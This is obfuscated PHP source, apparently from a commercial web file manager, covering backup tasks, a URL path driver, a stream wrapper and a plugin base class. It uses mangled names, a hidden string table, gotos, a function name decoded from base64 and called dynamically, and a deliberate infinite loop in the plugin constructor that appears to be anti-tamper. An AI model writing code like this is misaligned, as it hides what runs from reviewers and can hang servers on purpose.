if (in_array(self::AUTH_ROOT, $ÀÉ­áã¶)) { $°õ¸²…É = array_sum($„÷¹Ôã); return; } $—é¯Š¿» = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ÀÉ­áã¶ as $”ûö±ñì) { if (isset($—é¯Š¿»[$”ûö±ñì])) { $ÀÉ­áã¶ = array_merge($ÀÉ­áã¶, $—é¯Š¿»[$”ûö±ñì]); } } $ÀÉ­áã¶[] = self::AUTH_SHOW; $°õ¸²…É = array_sum(array_unique($ÀÉ­áã¶)); } public function sort($îŒª”²¶, $ìÓÁ½¢¤) { return parent::update($îŒª”²¶, $ìÓÁ½¢¤); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\x62\141\x63\153\165\x70\x4c\151\163\164"; public $field = array("\x69\x6f", "\x6e\141\x6d\145", "\163\x74\x61\164\165\x73", "\143\x6f\156\164\145\x6e\x74", "\x6d\141\156\x75\x61\154", "\162\x65\x73\165\x6c\164", "\x74\x69\x6d\145\x46\x72\x6f\155", "\164\151\155\145\124\x6f"); public function config() { $Ü£ßĞØ÷ =& $_SERVER[¶Ô„œ…¯]; Action($Ü£ßĞØ÷[2005])->taskInit(); $šÜœ¾‚¦ = Model($Ü£ßĞØ÷[848])->get($Ü£ßĞØ÷[862]); $šÜœ¾‚¦ = json_decode($šÜœ¾‚¦, !0); $šÜœ¾‚¦ = is_array($šÜœ¾‚¦) ? $šÜœ¾‚¦ : array(); $this->parseContent($šÜœ¾‚¦); unset($šÜœ¾‚¦[$Ü£ßĞØ÷[1749]]); Model($Ü£ßĞØ÷[1748])->cacheClear(); $„ÂŠï×ğ = $Ü£ßĞØ÷[2006]; $íôõ„Ü = Model($Ü£ßĞØ÷[2007])->findByKey($Ü£ßĞØ÷[1767], $„ÂŠï×ğ); if (!$íôõ„Ü) { $íôõ„Ü = array(); } if (isset($íôõ„Ü[$Ü£ßĞØ÷[206]])) { $íôõ„Ü[$Ü£ßĞØ÷[206]] = json_decode($íôõ„Ü[$Ü£ßĞØ÷[206]], !0); } if (isset($šÜœ¾‚¦[$Ü£ßĞØ÷[206]])) { $íôõ„Ü[$Ü£ßĞØ÷[206]][$Ü£ßĞØ÷[1752]] = $šÜœ¾‚¦[$Ü£ßĞØ÷[206]]; unset($šÜœ¾‚¦[$Ü£ßĞØ÷[206]]); } return array_merge($íôõ„Ü, $šÜœ¾‚¦); } public function listData($ä¡»£½Ú = false, $‘±Æû˜¬ = "\155\x6f\144\151\x66\171\x54\151\155\145", $É³µ“Øò = false) { $ŞøĞŠ = parent::listData($ä¡»£½Ú, $‘±Æû˜¬, !0); if (!$ŞøĞŠ) { return $ŞøĞŠ; } if ($ä¡»£½Ú) { $ŞøĞŠ = array($ŞøĞŠ); } foreach ($ŞøĞŠ as &$Ò›Æóù‚) { $this->parseContent($Ò›Æóù‚); } return $ä¡»£½Ú ? $ŞøĞŠ[0] : $ŞøĞŠ; } public function parseContent(&$û³ëáïÀ) { $ïÑÈ§êŸ =& $_SERVER[¶Ô„œ…¯]; $ºÜ×îàı = _get($û³ëáïÀ, $ïÑÈ§êŸ[171], $ïÑÈ§êŸ[91]); if (!in_array($ºÜ×îàı, array($ïÑÈ§êŸ[854], $ïÑÈ§êŸ[1216]))) { $û³ëáïÀ[$ïÑÈ§êŸ[171]] = $ºÜ×îàı == $ïÑÈ§êŸ[91] ? $ïÑÈ§êŸ[1216] : $ïÑÈ§êŸ[854]; } } public function lastItem() { $ì¹ç§ˆİ = $this->listData(); return !empty($ì¹ç§ˆİ[0]) ? $ì¹ç§ˆİ[0] : null; } public function kill($—İµöÅ) { $¼Ë©¼‡Ì =& $_SERVER[¶Ô„œ…¯]; $ŸçÈ›Ô» = $this->listData($—İµöÅ); if (!$ŸçÈ›Ô» || empty($ŸçÈ›Ô»[$¼Ë©¼‡Ì[32]])) { return !0; } Task::kill($¼Ë©¼‡Ì[861]); Task::kill($¼Ë©¼‡Ì[879]); Task::kill($¼Ë©¼‡Ì[888]); $ì¥ì±° = $ŸçÈ›Ô»[$¼Ë©¼‡Ì[32]]; $½ôÆ­ŠÄ = TEMP_FILES . $¼Ë©¼‡Ì[857] . $ì¥ì±° . $¼Ë©¼‡Ì[8]; IO::remove($½ôÆ­ŠÄ, !1); return $this->remove($—İµöÅ); } public function remove($¥¶ÏÚåÀ) { $¯£ˆÉù£ = $this->listData($¥¶ÏÚåÀ); if (!$¯£ˆÉù£) { return !0; } return $this->backupRemove($¯£ˆÉù£); } private function backupRemove($í®İÅ²„) { parent::remove($í®İÅ²„[$_SERVER[¶Ô„œ…¯][477]]); $ÒÁÎÏÜ“ = $this->backupPath($í®İÅ²„); IO::remove($ÒÁÎÏÜ“, !1); return !0; } private function backupPath($ìÄ¶¹–ı) { $¶ŠÆàÔÎ =& $_SERVER[¶Ô„œ…¯]; $“ŞëÚ–Î = $ìÄ¶¹–ı[$¶ŠÆàÔÎ[32]]; $Ù¡ªë× = Model($¶ŠÆàÔÎ[848])->get($¶ŠÆàÔÎ[849]); $‡‡öïè = substr(md5($¶ŠÆàÔÎ[850] . $Ù¡ªë× . $“ŞëÚ–Î), 0, 8); return "\x7b\151\157\72{$ìÄ¶¹–ı[$¶ŠÆàÔÎ[830]]}\175\x2f\x64\x61\x74\141\x62\x61\x73\145\x2f\142\141\x63\x6b\165\x70\57" . $“ŞëÚ–Î . $¶ŠÆàÔÎ[11] . $‡‡öïè; } public function start() { $ÀÓ‘ÖÖü =& $_SERVER[¶Ô„œ…¯]; if ($GLOBALS[$ÀÓ‘ÖÖü[6]][$ÀÓ‘ÖÖü[92]][$ÀÓ‘ÖÖü[2008]] != $ÀÓ‘ÖÖü[91]) { return !0; } $š²ŸÂš™ = $this->config(); if (!$š²ŸÂš™ || $š²ŸÂš™[$ÀÓ‘ÖÖü[1749]] != $ÀÓ‘ÖÖü[91]) { return !1; } if ($š²ŸÂš™[$ÀÓ‘ÖÖü[171]] == $ÀÓ‘ÖÖü[854]) { $÷öö¯Šó = Model($ÀÓ‘ÖÖü[848])->get($ÀÓ‘ÖÖü[1331]); if ($÷öö¯Šó == $ÀÓ‘ÖÖü[1332]) { $š²ŸÂš™[$ÀÓ‘ÖÖü[171]] = $ÀÓ‘ÖÖü[1216]; } } $Æ¬è›è = $this->process(); foreach ($Æ¬è›è as $ŞÂ—åÌÒ) { if ($ŞÂ—åÌÒ) { return Task::restart($ŞÂ—åÌÒ[$ÀÓ‘ÖÖü[477]]); } } $¢±ç˜‡ì = new Backup(); $ÉÄ‹¼ò© = $¢±ç˜‡ì->db(); if ($ÉÄ‹¼ò©) { $ÉÄ‹¼ò© = $¢±ç˜‡ì->dbFile(); if ($ÉÄ‹¼ò© && $š²ŸÂš™[$ÀÓ‘ÖÖü[171]] == $ÀÓ‘ÖÖü[854]) { $ÉÄ‹¼ò© = $¢±ç˜‡ì->file(); } } Backup::set(array($ÀÓ‘ÖÖü[828] => 1, $ÀÓ‘ÖÖü[839] => time())); return !0; } public function process() { $ÅÆ±™Ø =& $_SERVER[¶Ô„œ…¯]; $çĞª¨« = array($ÅÆ±™Ø[835] => Task::get($ÅÆ±™Ø[861]), $ÅÆ±™Ø[840] => Task::get($ÅÆ±™Ø[879]), $ÅÆ±™Ø[232] => Task::get($ÅÆ±™Ø[888])); $Û²ºö¹Ø = !1; foreach ($çĞª¨« as &$é³‰¨±‹) { if ($Û²ºö¹Ø) { $é³‰¨±‹ = !1; continue; } if ($é³‰¨±‹) { $ÎîüŞ¦½ = intval(_get($é³‰¨±‹, $ÅÆ±™Ø[1785], 0)); if (time() - $ÎîüŞ¦½ > 7200) { Task::kill($é³‰¨±‹[$ÅÆ±™Ø[477]]); $Û²ºö¹Ø = !0; $é³‰¨±‹ = !1; } } } return $çĞª¨«; } public function restore() { $Õ¯ªõ¾£ =& $_SERVER[¶Ô„œ…¯]; ActionCall($Õ¯ªõ¾£[1144], !0, 1); ActionCall($Õ¯ªõ¾£[1144], !0, 0); } } goto f™ôÙÓæƒ; AùÏ‹³ğî: $fileSize = strrev(base64_decode($_SERVER[ÏÆ£‘š][0])); function binCheckNeq($îú’‡‰¼, $‡ãÀ„Ô) { return $îú’‡‰¼ != $‡ãÀ„Ô; } $_SERVER[$_SERVER[ÏÆ£‘š][1]] = $fileSize($_SERVER[$_SERVER[ÏÆ£‘š][2]]); goto a„ê«°÷¢ß; C×®Î˜°Í: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($®®ÖÎşß = false) { } public function exist($öÎôˆÂŸ) { $œıç…¾ = $this->info($öÎôˆÂŸ); return $œıç…¾[$_SERVER[¶Ô„œ…¯][234]]; } public function isFile($¯­í¯Ó) { $‘§ÛÆÇÆ = $this->info($¯­í¯Ó); return $‘§ÛÆÇÆ[$_SERVER[¶Ô„œ…¯][234]]; } public function isFolder($Ùïµáı‹) { return !1; } public function size($û„›õ”) { $Æ­•úÈı = $this->info($û„›õ”); return $Æ­•úÈı[$_SERVER[¶Ô„œ…¯][79]]; } public function info($Ø‰¬ğ—Ï) { return $this->infoParse($Ø‰¬ğ—Ï); } public function infoAuth($ àæ“ï×) { return $this->infoParse($ àæ“ï×); } public function infoWithChildren($²±±ûï¯) { return $this->infoParse($²±±ûï¯); } public function infoFull($°üÙ’†) { return $this->infoParse($°üÙ’†); } private function infoParse($·ÏÂíş) { $Ë‚¥òŠ =& $_SERVER[¶Ô„œ…¯]; $ÕÒ¶áÅÆ = $this->header($·ÏÂíş); if (!$ÕÒ¶áÅÆ || !$ÕÒ¶áÅÆ[$Ë‚¥òŠ[828]]) { return !1; } $é™¶—Í = _get($ÕÒ¶áÅÆ, $Ë‚¥òŠ[414], 0); $·œ–İÂ­ = array($Ë‚¥òŠ[32] => $ÕÒ¶áÅÆ[$Ë‚¥òŠ[32]], $Ë‚¥òŠ[87] => $·ÏÂíş, $Ë‚¥òŠ[33] => $Ë‚¥òŠ[232], $Ë‚¥òŠ[79] => intval($é™¶—Í), $Ë‚¥òŠ[169] => get_path_ext($ÕÒ¶áÅÆ[$Ë‚¥òŠ[32]]), $Ë‚¥òŠ[1464] => $é™¶—Í > 0 && $ÕÒ¶áÅÆ[$Ë‚¥òŠ[1614]], $Ë‚¥òŠ[1465] => !1); return $·œ–İÂ­; } private function header($¡ä´Áéå) { $¬ôÍúšï =& $_SERVER[¶Ô„œ…¯]; if (isset(self::$_cacheHeader[$¡ä´Áéå])) { return self::$_cacheHeader[$¡ä´Áéå]; } $‘Ëß‹ïò = isset($GLOBALS[$¬ôÍúšï[1615]]) ? $GLOBALS[$¬ôÍúšï[1615]] : !1; $GLOBALS[$¬ôÍúšï[1615]] = !0; self::$_cacheHeader[$¡ä´Áéå] = url_header($¡ä´Áéå); $GLOBALS[$¬ôÍúšï[1615]] = $‘Ëß‹ïò; return self::$_cacheHeader[$¡ä´Áéå]; } public function hashSimple($›ˆÃÔ‰, $ĞŠò é¤ = false) { $øÙîïá =& $_SERVER[¶Ô„œ…¯]; $¤„ê‹™£ = $this->info($›ˆÃÔ‰); if (!$¤„ê‹™£ || !$¤„ê‹™£[$øÙîïá[234]]) { return !1; } $ï¹é©ïğ = $¤„ê‹™£[$øÙîïá[79]]; $Ûœ°Òµ± = 200; $Şè”î´¨ = 50; if ($ï¹é©ïğ <= $Ûœ°Òµ± * $Şè”î´¨) { return md5($this->fileSubstr($›ˆÃÔ‰, 0, $ï¹é©ïğ)) . $ï¹é©ïğ; } $¥¡‰¸Œ‰ = intval($ï¹é©ïğ / $Şè”î´¨); $ÅÒ—…Èµ = $øÙîïá[12]; $ßÎÅï‹Ù = timeFloat(); $Üœ°ô·Ë = 15; for ($Šœ›Œ‘ = 0; $Šœ›Œ‘ < $Şè”î´¨; $Šœ›Œ‘++) { if (timeFloat() - $ßÎÅï‹Ù > $Üœ°ô·Ë) { return !1; } $µÉ°üÕ² = $this->fileSubstr($›ˆÃÔ‰, $¥¡‰¸Œ‰ * $Šœ›Œ‘, $Ûœ°Òµ±); if (!$µÉ°üÕ²) { return !1; } $ÅÒ—…Èµ .= $µÉ°üÕ²; } $ÅÒ—…Èµ .= $this->fileSubstr($›ˆÃÔ‰, $ï¹é©ïğ - $Ûœ°Òµ±, $Ûœ°Òµ±); return md5($ÅÒ—…Èµ) . $ï¹é©ïğ; } public function getContent($è‡«’äî) { return $this->fileSubstr($è‡«’äî); } public function fileSubstr($ãñ›ªç, $¾Ù¸¶‰ø = 0, $ÚªÀ¬ü¸ = -1) { $ÖÊÆÑúó =& $_SERVER[¶Ô„œ…¯]; $»µÏÂÊ = $this->info($ãñ›ªç); if (!$»µÏÂÊ || !$»µÏÂÊ[$ÖÊÆÑúó[234]] && $»µÏÂÊ[$ÖÊÆÑúó[79]] > 1024 * 1024 * 10) { return !1; } if ($ÚªÀ¬ü¸ === -1) { $ÚªÀ¬ü¸ = $»µÏÂÊ[$ÖÊÆÑúó[79]]; } if ($ÚªÀ¬ü¸ == 0) { return $ÖÊÆÑúó[12]; } $Õ¤¢ò = array($ÖÊÆÑúó[1616] . $¾Ù¸¶‰ø . $ÖÊÆÑúó[864] . ($¾Ù¸¶‰ø + $ÚªÀ¬ü¸ - 1)); $áÎèÌ¿ = url_request($ãñ›ªç, $ÖÊÆÑúó[1504], !1, $Õ¤¢ò, !1, !1, 30); return $áÎèÌ¿[$ÖÊÆÑúó[1294]] ? $áÎèÌ¿[$ÖÊÆÑúó[1294]] : $ÖÊÆÑúó[12]; } public function download($™©Ã¡©Ë, $‘øÑŒ´Ø) { Downloader::start($™©Ã¡©Ë, $‘øÑŒ´Ø); return $‘øÑŒ´Ø; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÕˆÖö·­, $Ïì›½¼‡ = '') { $this->info = $this->info($ÕˆÖö·­); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¶Ô„œ…¯][87]]; $this->pathOpen = $ÕˆÖö·­; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÕˆÖö·­])) { self::$_chunkBuffer[$ÕˆÖö·­] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($å×ñÎ¦³) { $²»¡Ä» = $this->fileSubstr($this->pose, $å×ñÎ¦³); $this->pose += strlen($²»¡Ä»); return $²»¡Ä»; } public function stream_tell() { return $this->pose; } public function stream_seek($à¼ìÁ°…, $¯­­õ©) { $Ñä¶ÛË´ =& $_SERVER[¶Ô„œ…¯]; if ($¯­­õ© == SEEK_SET) { $this->pose = $à¼ìÁ°…; } else { if ($¯­­õ© == SEEK_CUR) { $this->pose += $à¼ìÁ°…; } else { if ($¯­­õ© == SEEK_END) { $this->pose = $this->info[$Ñä¶ÛË´[79]] + intval($à¼ìÁ°…); } } } if ($à¼ìÁ°… < 0) { $this->pose = $this->info[$Ñä¶ÛË´[79]] + $à¼ìÁ°…; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¶Ô„œ…¯][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ĞÃ¦µõŠ, $òÈœµƒæ) { $ùÑ” ¨ö =& $_SERVER[¶Ô„œ…¯]; $Õ¸æÜª = $this->info($ĞÃ¦µõŠ); return array($ùÑ” ¨ö[1407] => 0, $ùÑ” ¨ö[1617] => 0, $ùÑ” ¨ö[16] => 32768 + 511, $ùÑ” ¨ö[1618] => 0, $ùÑ” ¨ö[1619] => 0, $ùÑ” ¨ö[1620] => 0, $ùÑ” ¨ö[1621] => 0, $ùÑ” ¨ö[79] => $Õ¸æÜª[$ùÑ” ¨ö[79]], $ùÑ” ¨ö[1622] => $Õ¸æÜª[$ùÑ” ¨ö[1463]], $ùÑ” ¨ö[1579] => $Õ¸æÜª[$ùÑ” ¨ö[88]], $ùÑ” ¨ö[1578] => $Õ¸æÜª[$ùÑ” ¨ö[233]], $ùÑ” ¨ö[1623] => 0, $ùÑ” ¨ö[1624] => 0); } static $fileInfo = array(); public function info($Âó»×»ğ) { $¼ù”ßï = $_SERVER[¶Ô„œ…¯][1625]; if (isset(self::$fileInfo[$Âó»×»ğ])) { return self::$fileInfo[$Âó»×»ğ]; } if (substr($Âó»×»ğ, 0, strlen($¼ù”ßï)) != $¼ù”ßï) { return !1; } self::$fileInfo[$Âó»×»ğ] = IO::info(substr($Âó»×»ğ, strlen($¼ù”ßï))); return self::$fileInfo[$Âó»×»ğ]; } public static function read($ú²Êã­¹, $ĞÑéâĞÆ, $Âë«ö…ò) { if (!isset(self::$_fopenCache[$ú²Êã­¹])) { $î¸ˆ‹ˆˆ = new StreamWrapperIO(); $î¸ˆ‹ˆˆ->stream_open($ú²Êã­¹); self::$_fopenCache[$ú²Êã­¹] = $î¸ˆ‹ˆˆ; } $î¸ˆ‹ˆˆ = self::$_fopenCache[$ú²Êã­¹]; return $î¸ˆ‹ˆˆ->fileSubstr($ĞÑéâĞÆ, $Âë«ö…ò); } public static function _read($£»âˆşÊ, $ÚíŞãªÊ, $ı¹ÓÄ‘) { $ù ÷îÎ’ =& $_SERVER[¶Ô„œ…¯]; $âğÖà†Ô = fopen($£»âˆşÊ, $ù ÷îÎ’[1467]); if (!$âğÖà†Ô) { return $ù ÷îÎ’[12]; } $Ù˜É¥à = 8192; fseek($âğÖà†Ô, $ÚíŞãªÊ, SEEK_SET); $­³÷Òì = $ù ÷îÎ’[12]; $ÛÈ€Îó = 0; while ($ÛÈ€Îó < $ı¹ÓÄ‘) { $ĞŸÌ¶ë = min($Ù˜É¥à, $ı¹ÓÄ‘ - $ÛÈ€Îó); $­³÷Òì .= fread($âğÖà†Ô, $ĞŸÌ¶ë); $ÛÈ€Îó += $ĞŸÌ¶ë; } fclose($âğÖà†Ô); return $­³÷Òì; } public function fileSubstr($™ÖœÑˆÔ, $§Ú“µÀŸ) { $Ñ½©¸ã— =& $_SERVER[¶Ô„œ…¯]; $÷¹ÃåË = $this->info[$Ñ½©¸ã—[79]]; $ÅÙïĞ„“ = $™ÖœÑˆÔ; $éä†ü£ù = $§Ú“µÀŸ; if ($™ÖœÑˆÔ < 0) { $™ÖœÑˆÔ = $÷¹ÃåË + $™ÖœÑˆÔ; } if ($§Ú“µÀŸ === !1) { $§Ú“µÀŸ = $÷¹ÃåË - $™ÖœÑˆÔ; } if ($™ÖœÑˆÔ + $§Ú“µÀŸ > $÷¹ÃåË) { $§Ú“µÀŸ = $÷¹ÃåË - $™ÖœÑˆÔ; } if ($§Ú“µÀŸ <= 0) { return $Ñ½©¸ã—[12]; } if ($™ÖœÑˆÔ < 0 || $™ÖœÑˆÔ >= $÷¹ÃåË || $§Ú“µÀŸ <= 0 || $§Ú“µÀŸ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\151\154\145\x52\145\141\x64\40\145\x72\162\x6f\162\x21\40\x73\x74\x61\162\x74\75{$™ÖœÑˆÔ}\73\x6c\x65\156\147\164\x68\x3d{$§Ú“µÀŸ}\x3b\x20\x73\x69\x7a\x65\x3d{$÷¹ÃåË}\73"); } $ˆ„”¼÷ = 64 * 1024; $Æ‚¹õÕ– =& self::$_chunkBuffer[$this->path]; if (!$Æ‚¹õÕ–) { $Æ‚¹õÕ– = array(); } $ÌŞ«ø„ä = 0; $óÜ§£ßĞ = 0; $óÉˆ…Ô = $Ñ½©¸ã—[12]; foreach ($Æ‚¹õÕ– as $ÌŞ«ø„ä => $óÉˆ…Ô) { $ÌŞ«ø„ä = intval($ÌŞ«ø„ä); $óÜ§£ßĞ = $ÌŞ«ø„ä + strlen($óÉˆ…Ô); if ($™ÖœÑˆÔ >= $óÜ§£ßĞ) { continue; } if ($™ÖœÑˆÔ >= $ÌŞ«ø„ä && $™ÖœÑˆÔ + $§Ú“µÀŸ <= $óÜ§£ßĞ) { return substr($óÉˆ…Ô, $™ÖœÑˆÔ - $ÌŞ«ø„ä, $§Ú“µÀŸ); } break; } if (count($Æ‚¹õÕ–) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ñ½©¸ã—[1626], $Ñ½©¸ã—[1627] . count($Æ‚¹õÕ–) . "\x3b\163\x74\x61\162\x74\x3d{$™ÖœÑˆÔ}\x2c\x6c\x65\x6e\x67\x74\x68\75{$§Ú“µÀŸ}\73\160\157\163\x65\72{$ÌŞ«ø„ä}\x7e{$óÜ§£ßĞ}"); throw new Exception($Ñ½©¸ã—[1628]); } $§¤×Î½í = intval($™ÖœÑˆÔ / $ˆ„”¼÷) * $ˆ„”¼÷; $ïİéŒ„ò = ceil(($™ÖœÑˆÔ + $§Ú“µÀŸ) / $ˆ„”¼÷) * $ˆ„”¼÷ - $§¤×Î½í; $Ù»‡® = IO::fileSubstr($this->path, $§¤×Î½í, $ïİéŒ„ò); $Æ‚¹õÕ–[$§¤×Î½í . $Ñ½©¸ã—[12]] = $Ù»‡®; ksort($Æ‚¹õÕ–); $ïãıò‹å = substr($Ù»‡®, $™ÖœÑˆÔ - $§¤×Î½í, $§Ú“µÀŸ); return $ïãıò‹å; } private function log($ÈÌ± íµ, $É¿ß£‰¤) { $âñ÷ãÖÎ =& $_SERVER[¶Ô„œ…¯]; $Ö×©¦šá = timeFloat() - $this->timeStart; write_log(sprintf($âñ÷ãÖÎ[1629], $ÈÌ± íµ, $this->info[$âñ÷ãÖÎ[32]], $Ö×©¦šá, $É¿ß£‰¤), $âñ÷ãÖÎ[1271]); } } class Message { function __construct() { } public function send($•ÈØ»Öö = '', $‚ãÏİ‹ = array(), $âŒ„ê° = "\164\145\170\164") { $ûÕ‰§Ôø =& $_SERVER[¶Ô„œ…¯]; $ÃŒŸÖÉ = array($ûÕ‰§Ôø[33] => $ûÕ‰§Ôø[1220], $ûÕ‰§Ôø[171] => $•ÈØ»Öö); if (in_array($âŒ„ê°, array($ûÕ‰§Ôø[1220], $ûÕ‰§Ôø[1630]))) { $ÃŒŸÖÉ[$ûÕ‰§Ôø[33]] = $âŒ„ê°; } $‚ãÏİ‹ = array($ûÕ‰§Ôø[580] => isset($‚ãÏİ‹[$ûÕ‰§Ôø[580]]) ? $‚ãÏİ‹[$ûÕ‰§Ôø[580]] : $ûÕ‰§Ôø[12], $ûÕ‰§Ôø[667] => isset($‚ãÏİ‹[$ûÕ‰§Ôø[667]]) ? $‚ãÏİ‹[$ûÕ‰§Ôø[667]] : $ûÕ‰§Ôø[12]); if (empty($•ÈØ»Öö) || empty($‚ãÏİ‹[$ûÕ‰§Ôø[580]]) && empty($‚ãÏİ‹[$ûÕ‰§Ôø[667]])) { return !1; } $¶†ÊÈ = array($ûÕ‰§Ôø[1559] => $ÃŒŸÖÉ, $ûÕ‰§Ôø[1631] => $‚ãÏİ‹); Hook::trigger($ûÕ‰§Ôø[1632], $¶†ÊÈ); } } goto AÃÀ¼Œêå; AÃÀ¼Œêå: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¯ÅÇ–› =& $_SERVER[¶Ô„œ…¯]; if (!isset($_SERVER[$¯ÅÇ–›[919]]) || !isset($_SERVER[$¯ÅÇ–›[926]])) { $ƒ’äú£ı = $¯ÅÇ–›[964]; $«¸¼­ĞÅ = $¯ÅÇ–›[921]; $€Â®§Ñ¬ = $_SERVER[$¯ÅÇ–›[922]] . $¯ÅÇ–›[923]; $Ùƒı›‹ = $«¸¼­ĞÅ($€Â®§Ñ¬); $Œ‹ÍĞ¶û = explode($¯ÅÇ–›[287], $Ùƒı›‹); if (count($Œ‹ÍĞ¶û) < $¯ÅÇ–›[691]) { $ò½İú¿÷ = $¯ÅÇ–›[924]; $ò½İú¿÷(); } $˜©Üùª‡ = $¯ÅÇ–›[965]; $˜©Üùª‡($_SERVER[$¯ÅÇ–›[966]]); $ÌÄ‚ìÜÄ = 1; for ($šÑßÄŸ¸ = $ÌÄ‚ìÜÄ; $šÑßÄŸ¸ > 0; $šÑßÄŸ¸++) { $˜©Üùª‡ = json_encode($GLOBALS[$¯ÅÇ–›[494]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¯ÅÇ–›[1633]); $this->pluginName = str_replace($¯ÅÇ–›[1633], $¯ÅÇ–›[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¯ÅÇ–›[8]; $this->pluginApi = appHostGet() . $¯ÅÇ–›[1634] . $this->pluginName . $¯ÅÇ–›[8]; $this->pluginHost = $config[$¯ÅÇ–›[1635]] . $this->pluginName . $¯ÅÇ–›[8]; $this->pluginHostDefault = $config[$¯ÅÇ–›[1635]] . $this->pluginName . $¯ÅÇ–›[8]; $ÂÊî…î¶ = $config[$¯ÅÇ–›[1636]]; if ($ÂÊî…î¶ && strpos($¯ÅÇ–›[50] . $ÂÊî…î¶ . $¯ÅÇ–›[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¯ÅÇ–›[1637]] . $this->pluginName . $¯ÅÇ–›[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¶Ô„œ…¯][1638]); } protected function assign($È÷®ç¢«, $¢àÀ©›š = false) { if (is_array($È÷®ç¢«)) { $this->values = array_merge($this->values, $È÷®ç¢«); } else { $this->values[$È÷®ç¢«] = $¢àÀ©›š; } } protected function display($åÙÛ°ªˆ) { extract($this->values); require $åÙÛ°ªˆ; } final function hookRegist($ÓçÂêÎ) { $this->modelPlugin->appRegist($this->pluginName, $ÓçÂêÎ); } final function appIcon() { $£ú²ß°© =& $_SERVER[¶Ô„œ…¯]; $¤æ–®ñ = $this->appPackage(); $ÕØ¾ç¯ = $£ú²ß°©[12]; if (isset($¤æ–®ñ[$£ú²ß°©[492]])) { if (isset($¤æ–®ñ[$£ú²ß°©[492]][$£ú²ß°©[1639]])) { $ÕØ¾ç¯ = $£ú²ß°©[1640] . $¤æ–®ñ[$£ú²ß°©[492]][$£ú²ß°©[1639]] . $£ú²ß°©[1641]; } else { if ($¤æ–®ñ[$£ú²ß°©[492]][$£ú²ß°©[1642]]) { $ÕØ¾ç¯ = $£ú²ß°©[1643] . $¤æ–®ñ[$£ú²ß°©[492]][$£ú²ß°©[1642]] . $£ú²ß°©[1644]; } } } return $ÕØ¾ç¯; } final function fileCanView($Šò´¶°Ç) { $¯ç²¶Ğ¾ =& $_SERVER[¶Ô„œ…¯]; if (request_url_safe($Šò´¶°Ç)) { return !0; } if ($this->isShare($Šò´¶°Ç)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $˜°å¶„ù = $¯ç²¶Ğ¾[1645] . rawurlencode(this_url()); show_tips(LNG($¯ç²¶Ğ¾[1646]) . $¯ç²¶Ğ¾[1647] . $˜°å¶„ù . $¯ç²¶Ğ¾[1648] . LNG($¯ç²¶Ğ¾[1649]) . $¯ç²¶Ğ¾[1650], !1); } if (!Action($¯ç²¶Ğ¾[1651])->authCan($¯ç²¶Ğ¾[1652])) { show_tips(LNG($¯ç²¶Ğ¾[1653]) . $¯ç²¶Ğ¾[1654], !1); } ActionCall($¯ç²¶Ğ¾[1655], $Šò´¶°Ç); } final function isShare($ğÔ¢™Ï‘) { $¢Ç´÷È = KodIO::parse($ğÔ¢™Ï‘); return $¢Ç´÷È[$_SERVER[¶Ô„œ…¯][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($¬Äš°Èã) { if (request_url_safe($¬Äš°Èã)) { return $¬Äš°Èã; } if (!$this->isShare($¬Äš°Èã)) { $¬Äš°Èã = $this->filePath($¬Äš°Èã, !1); } return Action($_SERVER[¶Ô„œ…¯][1263])->linkOut($¬Äš°Èã); } public function filePathLinkOut($½¹âììÌ) { if (request_url_safe($½¹âììÌ)) { return $½¹âììÌ; } $this->fileCanView($½¹âììÌ); return Action($_SERVER[¶Ô„œ…¯][1263])->link($½¹âììÌ); } final function filePath($ŒÍ­¯Ï½, $š¥ÃäÌ‚ = true, $¾ªÍ“£ò = false) { $ï¨²È•‰ =& $_SERVER[¶Ô„œ…¯]; $´í›È¸ = $this->filePathGet($ŒÍ­¯Ï½, $š¥ÃäÌ‚); if (!$this->fileInfo) { show_tips(LNG($ï¨²È•‰[108]), !1); } if ($¾ªÍ“£ò && isset($this->fileInfo[$ï¨²È•‰[543]]) && $this->fileInfo[$ï¨²È•‰[543]]) { $Íûğíøì = Model($ï¨²È•‰[546])->fileInfo($this->fileInfo[$ï¨²È•‰[543]]); if (!$Íûğíøì || !IO::exist($Íûğíøì[$ï¨²È•‰[87]])) { show_tips(LNG($ï¨²È•‰[108]) . $ï¨²È•‰[1656]); } } Hook::trigger($ï¨²È•‰[1657], $´í›È¸); return $´í›È¸; } final function filePathGet($òÈÔğì§, $®Ù†ÀÅ = true) { $»¨áñ—° =& $_SERVER[¶Ô„œ…¯]; if ($ÖÃ·¹Ï = $this->checkSharePath($òÈÔğì§, $®Ù†ÀÅ)) { return $ÖÃ·¹Ï; } $this->fileCanView($òÈÔğì§); if (request_url_safe($òÈÔğì§)) { $¾©·©ƒ = parse_url_query($òÈÔğì§); if (isset($¾©·©ƒ[$»¨áñ—°[1658]]) && 